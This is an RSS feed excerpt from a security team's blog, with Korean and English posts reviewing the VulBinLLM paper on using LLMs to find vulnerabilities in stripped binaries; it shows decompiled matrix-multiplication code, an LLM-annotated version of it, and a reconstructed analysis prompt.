row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential out-of-bounds access if matrix dimensions (R1, C2, R2) are not validated</span><span class="hljs-comment">// before this function call. The pointer arithmetic relies on these external constants.</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result.</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}&gt;}</code></pre></p><hr><p>Now, apply this process to the following Ghidra decompiled code. Provide ONLY the optimized C code as your output.</p><p><strong>[YOUR CODE TO ANALYZE GOES HERE]</strong></p></blockquote><p>&#xC774;&#xB807;&#xAC8C; &#xC608;&#xC2DC;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xB418;&#xC11C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD10;&#xC57C;&#xD558;&#xB2C8; &#xC608;&#xC2DC;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; Gemini&#xC5D0; &#xB123;&#xC5B4;&#xBCF4;&#xC8E0;.</p><p>&#xACB0;&#xACFC;:</p><pre><code class="hljs c"><span class="hljs-comment">/**</span><span class="hljs-comment"> * @brief Performs matrix multiplication of matrix_A (R1 x R2) and matrix_B (R2 x C2).</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * This function reconstructs the logic for matrix multiplication. It takes pointers to two</span><span class="hljs-comment"> * matrices, `matrix_A_ptr` and `matrix_B_ptr`, and computes their product. The resulting</span><span class="hljs-comment"> * (R1 x C2) matrix is stored in a local stack variable `result_matrix`.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * The dimensions R1 (rows of A), R2 (cols of A / rows of B), and C2 (cols of B)</span><span class="hljs-comment"> * are assumed to be externally defined constants (e.g., preprocessor macros),</span><span class="hljs-comment"> * which is a common source of vulnerabilities.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Based on the memory access patterns from the decompilation:</span><span class="hljs-comment"> * - matrix_A is treated as an [R1][R2] integer matrix.</span><span class="hljs-comment"> * - matrix_B is treated as an [R2][C2] integer matrix.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Note: The original stack canary check (`in_FS_OFFSET`) has been removed for clarity</span><span class="hljs-comment"> * as it is a compiler-generated security mechanism and not part of the original logic.</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * @param matrix_A_ptr  Pointer to the first input matrix (assumed to be flattened R1xR2).</span><span class="hljs-comment"> * @param matrix_B_ptr  Pointer to the second input matrix (assumed to be flattened R2xC2).</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiply_matrices</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *matrix_A_ptr, <span class="hljs-keyword">int</span> *matrix_B_ptr)</span> </span>{    <span class="hljs-comment">// Vulnerability: Null Pointer Dereference</span>    <span class="hljs-comment">// The function does not check if input pointers are NULL before use. If either</span>    <span class="hljs-comment">// `matrix_A_ptr` or `matrix_B_ptr` is NULL, dereferencing them inside the loops</span>    <span class="hljs-comment">// will cause a segmentation fault and crash the application.</span>    <span class="hljs-comment">// To improve readability, we cast the flat input pointers to 2D array pointers.</span>    <span class="hljs-comment">// This mirrors the structured access intended by the original developer.</span>    <span class="hljs-comment">// The pointer arithmetic `(row * stride) + col_offset` is now `[row][col]`.</span>    <span class="hljs-comment">// The strides inferred from Ghidra (`* 8` for A, `* 0xc` for B) suggest R2=2 and C2=3.</span>    <span class="hljs-keyword">int</span> (*matrix_A)[R2] = (<span class="hljs-keyword">int</span> (*)[R2])matrix_A_ptr;    <span class="hljs-keyword">int</span> (*matrix_B)[C2] = (<span class="hljs-keyword">int</span> (*)[C2])matrix_B_ptr;    <span class="hljs-comment">// Vulnerability: Stack Buffer Overflow</span>    <span class="hljs-comment">// The result matrix is allocated on the stack with a size fixed at compile time</span>    <span class="hljs-comment">// via the macros R1 and C2. If the actual dimensions of the input matrices</span>    <span class="hljs-comment">// (determined by the caller) are larger than these compiled constants, the loops</span>    <span class="hljs-comment">// will write past the bounds of `result_matrix`, corrupting the stack.</span>    <span class="hljs-keyword">int</span> result_matrix[R1][C2];    <span class="hljs-comment">// Iterate over each row of the first matrix (matrix_A).</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; R1; current_row++) {        <span class="hljs-comment">// Iterate over each column of the second matrix (matrix_B).</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; C2; current_col++) {                        <span class="hljs-comment">// Initialize the target cell in the result matrix.</span>            result_matrix[current_row][current_col] = <span class="hljs-number">0</span>;            <span class="hljs-comment">// Calculate the dot product for the cell (current_row, current_col).</span>            <span class="hljs-comment">// This loop iterates over the shared dimension (columns of A and rows of B).</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; R2; shared_dim++) {                                <span class="hljs-comment">// Vulnerability: Integer Overflow</span>                <span class="hljs-comment">// The multiplication of two matrix elements can exceed the maximum value for an `int`,</span>                <span class="hljs-comment">// causing the value to wrap around (undefined behavior for signed integers).</span>                <span class="hljs-comment">// The subsequent accumulation into `result_matrix` could also overflow.</span>                                <span class="hljs-comment">// Vulnerability: Out-of-Bounds Read</span>                <span class="hljs-comment">// The loops iterate based on the external constants R1, R2, and C2. If these</span>                <span class="hljs-comment">// constants do not match the actual allocated sizes of the buffers pointed to</span>                <span class="hljs-comment">// by `matrix_A_ptr` and `matrix_B_ptr`, this operation will read from</span>                <span class="hljs-comment">// out-of-bounds memory, leading to information leakage or a crash.</span>                result_matrix[current_row][current_col] +=                    matrix_A[current_row][shared_dim] * matrix_B[shared_dim][current_col];            }        }    }    <span class="hljs-comment">// The function scope ends here. The `result_matrix` is destroyed upon returning.</span>    <span class="hljs-comment">// In a real-world scenario, its contents would likely have been copied to an</span>    <span class="hljs-comment">// output parameter pointer before the function returns.</span>}</code></pre><p>&#xBB54;&#xAC00; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xB354; &#xB514;&#xD14C;&#xC77C;&#xD558;&#xAC8C; &#xC8FC;&#xB294;&#xB370;&#xC694; &#xBB50; &#xC5B4;&#xCA0C;&#xB4E0;(?) &#xACB0;&#xACFC;&#xBB3C;&#xC740; &#xAD1C;&#xCC2E;&#xC544; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xB108;&#xBB34; &#xC124;&#xBA85;&#xC774; &#xB514;&#xD14C;&#xC77C;&#xD558;&#xB2E4;&#xAC70;&#xB098; &#xC601;&#xC5B4;&#xB97C; &#xC4F0;&#xB294; &#xB4F1; &#xB514;&#xD14C;&#xC77C;&#xD55C; &#xBD80;&#xBD84;&#xB4E4;&#xC740; &#xB354; &#xC218;&#xC815;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;.</p><h3 id="2-&#xC7A5;&#xAE30;-&#xAE30;&#xC5B5;-Long-term-Memory"><a href="#2-&#xC7A5;&#xAE30;-&#xAE30;&#xC5B5;-Long-term-Memory" class="headerlink" title="2) &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; (Long-term Memory)"></a>2) &#xC7A5;&#xAE30; &#xAE30;&#xC5B5; (Long-term Memory)</h3><p>LLM&#xC758; &#xACE0;&#xC9C8;&#xC801;&#xC778; &#xBB38;&#xC81C; &#xC911; &#xD558;&#xB098;&#xAC00; &#xC785;&#xB825; &#xAE38;&#xC774; &#xC81C;&#xD55C;(Context Window)&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xB97C; &#xD55C; &#xBC88;&#xC5D0; &#xB123;&#xC5B4;&#xC904; &#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8;, &#xCF54;&#xB4DC;&#xB97C; &#xC798;&#xAC8C; &#xCABC;&#xAC1C;&#xC11C; &#xBB3C;&#xC5B4;&#xBD10;&#xC57C; &#xD558;&#xC8E0;. &#xADFC;&#xB370; &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xB9E5;&#xB77D;&#xC744; &#xB193;&#xCE58;&#xAE30; &#xC27D;&#xC2B5;&#xB2C8;&#xB2E4;. A&#xB77C;&#xB294; &#xD568;&#xC218;&#xAC00; B&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xADF8; &#xACB0;&#xACFC;&#xAC00; C&#xB77C;&#xB294; &#xBCC0;&#xC218;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xD750;&#xB984;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xAC70;&#xC8E0;.</p><p>VulBinLLM&#xC740; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#x2018;&#xC7A5;&#xAE30; &#xAE30;&#xC5B5;&#x2019;&#xC774;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC744; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xC758; &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;(&#xC608;: &#xD568;&#xC218; &#xC694;&#xC57D;, &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870; &#xB4F1;)&#xC744; &#xBBF8;&#xB9AC; &#xC694;&#xC57D;&#xD574;&#xC11C; &#xC800;&#xC7A5;&#xD574;&#xB450;&#xACE0;, LLM&#xC774; &#xB2E4;&#xB978; &#xCF54;&#xB4DC; &#xC870;&#xAC01;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C; &#xC774; &#x2018;&#xAE30;&#xC5B5;&#x2019;&#xC744; &#xD568;&#xAED8; &#xCC38;&#xACE0;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xB17C;&#xBB38;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC774; &#xC815;&#xBCF4;&#xC5D0;&#xB294; <strong>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBAA9;&#xC801;&#xC5D0; &#xB300;&#xD55C; &#xC694;&#xC57D;, &#xD575;&#xC2EC; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;, &#xD568;&#xC218; &#xD638;&#xCD9C; &#xADF8;&#xB798;&#xD504;(Call Graph)</strong> &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD560; &#xB54C;, LLM&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCD94;&#xAC00; &#xC815;&#xBCF4;&#xB97C; &#xD568;&#xAED8; &#xBC1B;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC694;&#xC57D;:</strong> &#x201C;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C;&#xBD80;&#xD130; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xBC1B;&#xC544; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD14C;&#xC2A4;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;.&#x201D;</li><li><strong>&#xB370;&#xC774;&#xD130; &#xD750;&#xB984;:</strong> &#x201C;<code>getenv</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC785;&#xB825;&#xC774; <code>user_input</code> &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0;, &#xC774; &#xBCC0;&#xC218;&#xB294; <code>memcpy</code> &#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;(source)&#xB85C; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.&#x201D;</li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xB9E5;&#xB77D; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xC73C;&#xBA74;, LLM&#xC740; <code>user_input</code>&#xC774; &#xADF8;&#xB0E5; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#x2018;&#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC678;&#xBD80; &#xC785;&#xB825;&#x2019;&#xC774;&#xB77C;&#xB294; &#xC810;&#xC744; &#xBA85;&#xD655;&#xD788; &#xC778;&#xC9C0;&#xD558;&#xACE0;, &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB354; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xD310;&#xB2E8;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h2><p>&#xC624;&#xB298;&#xC740; &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D; &#xB17C;&#xBB38; &#xB0B4;&#xC6A9;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC2E4; &#xB17C;&#xBB38;&#xC758; &#xC544;&#xC26C;&#xC6B4; &#xC810;&#xC774; &#xC880; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xCD5C;&#xC2E0; LLM &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;: &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC5EC;&#xB7EC; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB3C4; &#xAC19;&#xC774; &#xBCF4;&#xC774;&#xB294; &#xB2E8;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xBAA8;&#xB378;&#xC758; &#xAC1C;&#xBC1C; &#xC18D;&#xB3C4;&#xAC00; &#xC6CC;&#xB099; &#xBE60;&#xB974;&#xB2E4;&#xBCF4;&#xB2C8; &#xC124;&#xACC4;&#xD558;&#xACE0; &#xAC1C;&#xBC1C;&#xD558;&#xACE0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD55C; &#xB4A4;&#xC5D0; &#xB17C;&#xBB38;&#xC744; &#xC4F0;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC815;&#xB9D0; &#xC2E0;&#xBC15;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xC77C;&#xAE4C;&#x2026;?: Stripped Binary &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xB17C;&#xBB38;&#xC740; &#xC774;&#xBBF8; &#xB098;&#xC640;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC774; &#xB17C;&#xBB38;&#xC758; &#xD575;&#xC2DC; &#xC5F0;&#xAD6C; &#xAC00;&#xCE58;&#xC77C;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xC880; &#xC758;&#xC544;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xCD5C;&#xADFC; LLM &#xAD00;&#xB828; &#xB17C;&#xBB38;&#xB4E4;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC774; &#xB098;&#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC815;&#xB9D0; &#xC88B;&#xC740; &#xB17C;&#xBB38;&#xC744; &#xACE8;&#xB77C; &#xC77D;&#xAE30;&#xB294; &#xC27D;&#xC9C0; &#xC54A;&#xC544; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB9CC; &#xD6D1;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xAE34;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xC88B;&#xC740; &#xB17C;&#xBB38;&#xC774; &#xBCF4;&#xC774;&#xBA74; &#xB610; &#xACF5;&#xBD80;&#xD574;&#xC11C; &#xC62C;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p>&#xADF8;&#xB7FC; &#xB610; &#xC5B8;&#xC820;&#xAC04;&#x2026; &#xB2E4;&#xC74C; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC62C;&#xAC8C;&#xC694;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/VulBinLLM/">VulBinLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 2. VulBinLLM Review(EN)</title>
      <link>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/06/15/j0ker/llm_part2/en/</guid>
      <pubDate>Sun, 15 Jun 2025 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/06/15/j0ker/llm_part2/en/9xgtc2.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello! It&amp;#x2019;s been 6 months since I&amp;#x2019;ve been back</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/06/15/j0ker/llm_part2/en/9xgtc2.jpg" alt="index_img"></p><p>Hello! It&#x2019;s been 6 months since I&#x2019;ve been back to &#x2026;. I&#x2019;m j0ker! The reason for the lack of posts in the first half of 2025 is&#x2026; I was too busy&#x2026; lol Even while I was busy, I was slowly following up on LLM-related trends, but as more and more papers and technologies come out, it&#x2019;s hard to keep up&#x2026; For God&#x2019;s sake&#x2026; When do you get to work?</p><p>So, rather than summarise the overall trend, I&#x2019;ll just summarise what I&#x2019;ve been reading for the time being. Today&#x2019;s paper is &#x201C;VulBinLLM: LLM-powered Vulnerability Detection for Stripped Binaries&#x201D;. I started reading the paper with the thought that it&#x2019;s about finding stripped binary vulnerabilities with LLM&#x2026; is this really possible?</p><p><img src="/2025/06/15/j0ker/llm_part2/en/9xgth1.jpg" alt="image.jpg"></p><blockquote><p>Try your best, LLM&#x2026;</p></blockquote><h2 id="1-Can-LLM-be-used-to-find-vulnerabilities"><a href="#1-Can-LLM-be-used-to-find-vulnerabilities" class="headerlink" title="1. Can LLM be used to find vulnerabilities?"></a>1. Can LLM be used to find vulnerabilities?</h2><p>This is the topic that fandu presented at the Hackyboiz Open Seminar a few days ago. It&#x2019;s a very simple but powerful idea: &#x201C;Hey, can we LLM this because it&#x2019;s hard for humans to read?&#x201D; Team Atlanta found a zero-day vulnerability in SQLite at AIxCC last year, Project0 found a vulnerability&#x2026; and now X also found a zero-day vulnerability in Linux SMB using LLM.</p><ul><li><a href="https://sean.heelan.io/2025/05/22/how-i-used-o3-to-find-cve-2025-37899-a-remote-zeroday-vulnerability-in-the-linux-kernels-smb-implementation/">How I used o3 to find CVE-2025-37899, a remote zeroday vulnerability in the Linux kernel&#x2019;s SMB implementation</a></li></ul><p>This article caused quite a stir on X (formerly Twitter).</p><p><img src="/2025/06/15/j0ker/llm_part2/en/x_1.png" alt="image.png"></p><blockquote><p>Tons of likes and retweets&#x2026;. Give our team account a lot of love too&#x2026;! <a href="https://x.com/hackyboiz">@hackyboiz</a></p></blockquote><p>It seems too obvious that we can use LLMs to find zero-days.</p><h2 id="2-Stripped-Binary"><a href="#2-Stripped-Binary" class="headerlink" title="2. Stripped Binary"></a>2. Stripped Binary</h2><p>First of all, you should know what a &#x2018;Stripped Binary&#x2019; is, right? When we usually write C or C++ code and compile it, we get an executable (binary) file, right? When debugging, it&#x2019;s easy to analyse because it contains all the information (symbols) like function names and variable names.<br>But when it&#x2019;s deployed, it&#x2019;s stripped of all this information to reduce the size and make it harder for hackers like us to analyse. This is what Stripped Binary is: function names are changed to <code>sub_401000</code> or something like that, you don&#x2019;t even know what the variables are&#x2026; and analysing them is a real nightmare. When I was first doing CTF or bug hunting, I had a chance to analyse an open source vulnerability by looking at a stripped binary, and it was a new world&#x2026; No, it&#x2019;s so easy to analyse? (That&#x2019;s why I&#x2019;ve been looking for vulnerabilities in open source since then&#x2026;)</p><h2 id="3-So-how-are-you-going-to-find-vulnerabilities-with-LLM"><a href="#3-So-how-are-you-going-to-find-vulnerabilities-with-LLM" class="headerlink" title="3. So how are you going to find vulnerabilities with LLM?"></a>3. So how are you going to find vulnerabilities with LLM?</h2><p>The main goal of this thesis is to create VulBinLLM, a system that uses LLM to automatically find vulnerabilities in stripped binaries. But can we just paste the decompiled code and tell LLM &#x201C;hey, find vulnerabilities&#x201D; and it will work? Yes, for simple code. But on larger, more massive chunks of code? If it&#x2019;s stripped binary and doesn&#x2019;t even have proper function and variable names? It&#x2019;s a recipe for bullshit. The real contribution of this paper is how to solve that &#x201C;how?&#x201D;.</p><p>In the thesis, we designed the following systematic structure to solve this problem.</p><p><img src="/2025/06/15/j0ker/llm_part2/en/figure1.png" alt="image.png"></p><p>Instead of just putting binaries into LLM, we built a clear pipeline: <strong>Decompilation -&gt; Optimisation -&gt; Long-term memory generation -&gt; LLM analysis</strong>. In particular, the &#x2018;optimisation&#x2019; and &#x2018;long-term memory&#x2019; parts are the core of this research.</p><h3 id="1-Decompilation-Optimisation-Refining-code-for-LLM"><a href="#1-Decompilation-Optimisation-Refining-code-for-LLM" class="headerlink" title="1) Decompilation Optimisation: Refining code for LLM"></a>1) Decompilation Optimisation: Refining code for LLM</h3><p>The first key is &#x2018;decompilation optimisation&#x2019;. The example below illustrates this process very clearly.</p><p>Before Optimisation (Ghidra):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1, <span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span>{local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-keyword">for</span> (*(<span class="hljs-keyword">long</span> *)local_34 = <span class="hljs-number">0</span>; *(<span class="hljs-keyword">long</span> *)local_34 &lt; R1; local_34++) {<span class="hljs-keyword">for</span> (local_30 = <span class="hljs-number">0</span>; local_30 &lt; C2; local_30++) {(auStack_28)[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (local_2c = <span class="hljs-number">0</span>; local_2c &lt; R2; local_2c++) {auStack_28[(<span class="hljs-keyword">long</span>)local_34 * C2 + (<span class="hljs-keyword">long</span>)local_30] += *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">0xc</span> + param_2 + (<span class="hljs-keyword">long</span>)local_30 * <span class="hljs-number">4</span>)* *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span>)local_34 * <span class="hljs-number">8</span> + param_1 + (<span class="hljs-keyword">long</span>)local_2c * <span class="hljs-number">4</span>);}}}}</code></pre><p>As you can see, the variable names don&#x2019;t make sense, like <code>param_1</code>, <code>local_34</code>, and <code>R2</code>, and although there are several loop statements used, it&#x2019;s not immediately obvious what&#x2019;s going on.</p><p>After optimisation (VulBinLLM):</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">multiplyMatrix</span><span class="hljs-params">(<span class="hljs-keyword">long</span> input_matrix_1, <span class="hljs-keyword">long</span> input_matrix_2)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// Initialize a matrix to store the result of matrix multiplication</span><span class="hljs-keyword">int</span> result_matrix[row_1][column_2] = {<span class="hljs-number">0</span>};<span class="hljs-comment">// Iterate over each row and column of the result matrix</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_row = <span class="hljs-number">0</span>; current_row &lt; row_1; current_row++) {<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> current_col = <span class="hljs-number">0</span>; current_col &lt; column_2; current_col++) {<span class="hljs-comment">// Perform matrix multiplication by iterating over the shared dimension</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> shared_dim = <span class="hljs-number">0</span>; shared_dim &lt; row_2; shared_dim++) {<span class="hljs-comment">// Vulnerability: Potential pointer arithmetic issue if column_1 and row_2 are not properly allocated</span><span class="hljs-comment">// Multiply corresponding elements from the input matrices and accumulate the result</span>result_matrix[current_row][current_col] += *((<span class="hljs-keyword">int</span> *)(input_matrix_2 + shared_dim * <span class="hljs-number">12</span> + current_col * <span class="hljs-number">4</span>)) * *((<span class="hljs-keyword">int</span> *)(input_matrix_1 + current_row * <span class="hljs-number">8</span> + shared_dim * <span class="hljs-number">4</span>));}}}}</code></pre><p>After the optimisation, the code looks completely different: local_10 becomes result_matrix and comments are added, making it easier to see the full context of the function. They also provide information about potential vulnerabilities.</p><p>Unfortunately, the paper doesn&#x2019;t provide how the prompts were created in this process, but if we reverse this back to LLM and ask him to create the prompts, it looks like this</p><blockquote><p>You are a <strong>world-class cybersecurity expert specializing in reverse engineering</strong>. Your primary task is to analyze raw C code decompiled by Ghidra from a <strong>stripped binary</strong>. You need to refactor this code to maximize readability and, most importantly, <strong>identify and annotate potential security vulnerabilities</strong> for a security audit.</p><p>The input code will lack original symbols, have generic variable names (e.g., <code>param_1</code>, <code>local_10</code>), and use complex pointer arithmetic. Your job is to semantically reconstruct the original developer&#x2019;s intent and analyze it from a security perspective.</p><p><strong>Follow these steps precisely:</strong></p><ol><li><p><strong>Semantic Analysis &amp; Renaming:</strong></p><ul><li>Infer the high-level purpose of the function (e.g., string copy, matrix multiplication, network packet processing).</li><li>Rename the function and its parameters (<code>param_1</code>, <code>param_2</code>, etc.) to reflect their inferred purpose (e.g., <code>multiplyMatrix</code>, <code>input_matrix_1</code>, <code>input_matrix_2</code>).</li><li>Rename local variables (<code>local_...</code>, <code>auStack_...</code>) to descriptive names based on their usage (e.g., <code>result_matrix</code>, <code>current_row</code>, <code>current_col</code>).</li></ul></li><li><p><strong>Code Refactoring for Readability:</strong></p><ul><li>Convert complex pointer arithmetic into more intuitive array or struct notation. For example, transform <code>*(int *)((long)local_2c * 0xc + param_2 + (long)local_30 * 4)</code> into a clearer form like <code>input_matrix_2[shared_dim][current_col]</code>.</li><li>Reconstruct data structures. If memory access patterns suggest a multi-dimensional array, represent it as such.</li><li>Simplify control flow and logic where possible without changing the functionality.</li></ul></li><li><p><strong>Vulnerability Identification &amp; Annotation:</strong></p><ul><li>Scrutinize the code for common C/C++ vulnerabilities, including but not limited to:<ul><li><strong>Buffer Overflows/Underflows:</strong> Unchecked indexing or pointer arithmetic.</li><li><strong>Integer Overflows/Underflows:</strong> Operations that could lead to wrapping.</li><li><strong>Null Pointer Dereferences:</strong> Use of pointers that could be null.</li><li><strong>Use-After-Free:</strong> Accessing memory after it has been freed.</li><li><strong>Information Leakage:</strong> Exposing sensitive data.</li></ul></li><li>For <strong>each potential vulnerability found</strong>, insert a comment in the line immediately preceding the vulnerable code. The comment must start with <code>// Vulnerability:</code> and provide a concise explanation of the potential risk.</li></ul></li><li><p><strong>Add Explanatory Comments:</strong></p><ul><li>Add a high-level comment at the beginning of the function explaining its overall purpose.</li><li>Add comments to explain complex or non-obvious parts of the algorithm.</li></ul></li></ol><p><strong>Here is an example of the desired transformation:</strong></p><p><strong>[INPUT] Raw Decompiled Code from Ghidra:</strong><br><pre><code class="hljs 